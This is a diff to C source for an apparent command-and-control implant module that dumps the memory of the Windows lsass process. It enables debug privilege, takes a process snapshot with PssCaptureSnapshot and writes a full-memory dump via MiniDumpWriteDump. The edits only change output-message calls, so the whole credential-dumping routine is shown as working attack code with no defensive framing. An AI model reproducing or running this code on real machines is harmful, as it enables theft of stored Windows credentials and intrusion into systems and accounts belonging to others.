@@ -203,7 +203,7 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {
 	DWORD l_pid = 0;
 
 	if (! BadgerAddPrivilege(SE_DEBUG_NAME)) {
-		BadgerDispatchW(dispatch, L"[-] E: Debug privilege\n");
+		BadgerDispatch(dispatch, "[-] E: Debug privilege\n");
 		return;
 	}
 
@@ -220,10 +220,10 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {
 		}
 	}
 	if (hProcess == NULL || l_pid == 0) {
-		BadgerDispatchW(dispatch, L"[-] E: lsass handle\n");
+		BadgerDispatch(dispatch, "[-] E: lsass handle\n");
 		return;
 	}
-    BadgerDispatchW(dispatch, L"[+] Lsass: %lu\n", l_pid);
+    BadgerDispatch(dispatch, "[+] Lsass: %lu\n", l_pid);
 
 	PSS_CAPTURE_FLAGS SSH_Flags = (PSS_CAPTURE_FLAGS) (PSS_CAPTURE_VA_CLONE
 		| PSS_CAPTURE_HANDLES
@@ -241,26 +241,26 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {
 
 	DWORD checkstat = Kernel32$PssCaptureSnapshot(hProcess, SSH_Flags, CONTEXT_ALL, (HPSS*) &SSHHandle);
 	if (checkstat != ERROR_SUCCESS) {
-		BadgerDispatchW(dispatch, L"[-] E: %lx\n", Kernel32$GetLastError());
+		BadgerDispatch(dispatch, "[-] E: %lx\n", Kernel32$GetLastError());
 		Kernel32$CloseHandle(hProcess);
 		return;
 	}
-	BadgerDispatchW(dispatch, L"[+] Snapshot captured\n");
+	BadgerDispatch(dispatch, "[+] Snapshot captured\n");
 
 	MINIDUMP_CALLBACK_INFORMATION CallbackInfo = { 0 };
 	CallbackInfo.CallbackRoutine = Ex_MiniDumpWriteDumpCallback;
 
 	HANDLE hFile = Kernel32$CreateFileW(path2dump, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
-		BadgerDispatchW(dispatch, L"[-] E: %lu\n", Kernel32$GetLastError());
+		BadgerDispatch(dispatch, "[-] E: %lu\n", Kernel32$GetLastError());
 		Kernel32$CloseHandle(hProcess);
 		return;
 	}
 
 	if (!Dbghelp$MiniDumpWriteDump(SSHHandle, l_pid, hFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo)) {
-		BadgerDispatchW(dispatch, L"[-] E: %lx\n", Kernel32$GetLastError());
+		BadgerDispatch(dispatch, "[-] E: %lx\n", Kernel32$GetLastError());
 	} else {
-		BadgerDispatchW(dispatch, L"[+] Memory dumped to %ls\n", path2dump);
+		BadgerDispatchW(dispatch, L"[+] Memory dumped to %s\n", path2dump);
 	}
 	Kernel32$PssFreeSnapshot((HANDLE)-1, SSHHandle);
 	Kernel32$CloseHandle(hProcess);
